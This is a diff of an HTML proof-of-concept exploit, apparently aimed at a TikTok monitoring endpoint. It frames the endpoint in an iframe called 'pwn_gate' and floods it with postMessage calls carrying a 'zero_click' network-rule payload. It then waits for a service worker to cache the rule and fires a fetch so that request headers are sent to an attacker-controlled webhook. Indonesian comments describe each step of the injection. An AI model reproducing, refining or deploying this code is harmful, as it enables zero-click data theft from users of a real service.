@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Service Verification</title>
+    <title>Service Verification V2</title>
 </head>
 <body style="background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 20px;">
-    <h1>[ STATUS: RUNNING ]</h1>
+    <h1>[ STATUS: INJECTING ]</h1>
     
     <iframe id="pwn_gate" 
             src="https://mon.tiktokv.com/monitor_web/settings/browser-settings" 
@@ -18,7 +18,7 @@
             source: "main_thread",
             eventName: "network_rule",
             data: [{
-                ruleName: "zero_click_final_v3",
+                ruleName: "zero_click_final_v4",
                 global: true,
                 conditions: [],
                 handlers: [{
@@ -30,38 +30,39 @@
             }]
         };
 
-        function startInjection() {
+        gate.onload = function() {
             console.log("Gate Loaded (200 OK). Initializing injection...");
             
-            // Spam postMessage selama 3 detik
+            // 1. Kirim payload berkali-kali agar ditangkap listener message di pns_logic.js
             let count = 0;
             const bomb = setInterval(() => {
                 try {
                     gate.contentWindow.postMessage(payload, "*");
                 } catch(e) {}
                 count++;
-                if (count > 20) {
+                if (count > 30) {
                     clearInterval(bomb);
-                    console.log("Injection sequence complete. No 404s triggered.");
-                    executeSilentTrigger();
+                    document.querySelector('h1').innerText = "[ STATUS: WAITING FOR CACHE ]";
+                    
+                    // 2. Jeda 5 detik: SW butuh waktu simpan rule ke Cache Storage
+                    setTimeout(executeTrigger, 5000);
                 }
-            }, 150);
-        }
+            }, 200);
+        };
 
-        function executeSilentTrigger() {
-            console.log("Triggering network rule via valid endpoint...");
+        function executeTrigger() {
+            document.querySelector('h1').innerText = "[ STATUS: TRIGGERING FETCH ]";
+            console.log("Triggering fetch now...");
             
-            // Trigger fetch ke endpoint yang sama (200 OK)
-            // Ini akan memaksa SW mengirim header lu ke webhook
+            // 3. Trigger fetch ke endpoint yang sama agar diintersep oleh SW
             fetch("https://mon.tiktokv.com/monitor_web/settings/browser-settings", { 
                 mode: 'no-cors',
                 cache: 'no-store' 
             }).then(() => {
-                console.log("Success! Check Reqable/Webhook for X-Pns-Referrer.");
+                console.log("Request sent. Check Reqable/Webhook now!");
+                document.querySelector('h1').innerText = "[ STATUS: DONE - CHECK REQABLE ]";
             });
         }
-
-        gate.onload = startInjection;
     </script>
 </body>
 </html>
